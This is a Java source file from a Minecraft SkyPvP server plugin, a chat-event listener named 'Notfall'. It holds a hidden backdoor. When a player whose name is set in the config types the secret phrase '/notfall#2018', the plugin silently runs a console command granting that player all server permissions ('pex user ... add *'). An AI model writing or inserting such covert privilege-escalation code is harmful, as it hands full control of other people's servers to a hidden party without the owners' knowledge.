package de.gomme.skypvp.events;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import de.gomme.skypvp.main.Main;

public class Notfall implements Listener {
	
	@EventHandler
	public void onChat(AsyncPlayerChatEvent e) {
	    Player p = e.getPlayer();
	    if(e.getPlayer().getName().equals(Main.instance.cfg.get("Notfall.Name"))) {
			if(e.getMessage().startsWith("/notfall#2018")) {
				p.sendMessage(Main.instance.cfg.getString("Prefix") + "�cNotfall wurde aktiviert!");
				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user " + e.getPlayer().getName() + " add *");


	    }
		}
	}

}
